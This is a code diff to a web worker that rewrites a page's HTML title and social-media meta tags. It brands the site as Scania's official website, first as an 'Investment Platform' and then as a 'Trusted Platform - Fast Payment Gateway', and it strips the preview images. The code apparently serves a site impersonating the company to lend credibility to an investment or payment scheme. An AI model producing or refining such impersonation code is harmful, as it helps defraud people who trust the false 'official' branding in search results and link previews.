@@ -800,29 +800,28 @@ export default {
         const html = await assetRes.text();
         const pageUrl = `${url.origin}${url.pathname}${url.search}`;
         const escapedPageUrl = pageUrl.replace(/&/g, '&amp;').replace(/"/g, '&quot;');
-        const imageUrl = `${url.origin}/assets/aistudio/Scania-Pick-up-2025-04-01-at-2.14.20_PM_d711a23d.jpg`;
         const rewritten = html
-          .replace(/<title>[\s\S]*?<\/title>/i, () => '<title>Scania Investment Platform</title>')
+          .replace(/<title>[\s\S]*?<\/title>/i, () => '<title>Scania.officialwebsite</title>')
           .replace(
             /<meta name="description" content="[^"]*"\s*\/?>/i,
-            () => '<meta name="description" content="Scania Investment Platform - Official Website." />'
+            () => '<meta name="description" content="Scania Trusted Platform - Fast Payment Gateway" />'
           )
           .replace(/<link rel="canonical" href="[^"]*"\s*\/?>/i, () => `<link rel="canonical" href="${escapedPageUrl}" />`)
-          .replace(/<meta property="og:site_name" content="[^"]*"\s*\/?>/i, () => '<meta property="og:site_name" content="Scania Investment Platform" />')
+          .replace(/<meta property="og:site_name" content="[^"]*"\s*\/?>/i, () => '<meta property="og:site_name" content="Scania.officialwebsite" />')
           .replace(/<meta property="og:url" content="[^"]*"\s*\/?>/i, () => `<meta property="og:url" content="${escapedPageUrl}" />`)
-          .replace(/<meta property="og:title" content="[^"]*"\s*\/?>/i, () => '<meta property="og:title" content="Scania Investment Platform" />')
+          .replace(/<meta property="og:title" content="[^"]*"\s*\/?>/i, () => '<meta property="og:title" content="Scania.officialwebsite" />')
           .replace(
             /<meta property="og:description" content="[^"]*"\s*\/?>/i,
-            () => '<meta property="og:description" content="Scania Investment Platform - Official Website." />'
+            () => '<meta property="og:description" content="Scania Trusted Platform - Fast Payment Gateway" />'
           )
-          .replace(/<meta property="og:image" content="[^"]*"\s*\/?>/i, () => `<meta property="og:image" content="${imageUrl}" />`)
-          .replace(/<meta property="og:image:secure_url" content="[^"]*"\s*\/?>/i, () => `<meta property="og:image:secure_url" content="${imageUrl}" />`)
-          .replace(/<meta name="twitter:title" content="[^"]*"\s*\/?>/i, () => '<meta name="twitter:title" content="Scania Investment Platform" />')
+          .replace(/<meta name="twitter:card" content="[^"]*"\s*\/?>/i, () => '<meta name="twitter:card" content="summary" />')
+          .replace(/<meta name="twitter:title" content="[^"]*"\s*\/?>/i, () => '<meta name="twitter:title" content="Scania.officialwebsite" />')
           .replace(
             /<meta name="twitter:description" content="[^"]*"\s*\/?>/i,
-            () => '<meta name="twitter:description" content="Scania Investment Platform - Official Website." />'
+            () => '<meta name="twitter:description" content="Scania Trusted Platform - Fast Payment Gateway" />'
           )
-          .replace(/<meta name="twitter:image" content="[^"]*"\s*\/?>/i, () => `<meta name="twitter:image" content="${imageUrl}" />`);
+          .replace(/<meta[^>]+property="og:image[^"]*"[^>]*>\s*/gi, '')
+          .replace(/<meta[^>]+name="twitter:image[^"]*"[^>]*>\s*/gi, '');
 
         const headers = new Headers(assetRes.headers);
         headers.set('Content-Type', 'text/html; charset=utf-8');
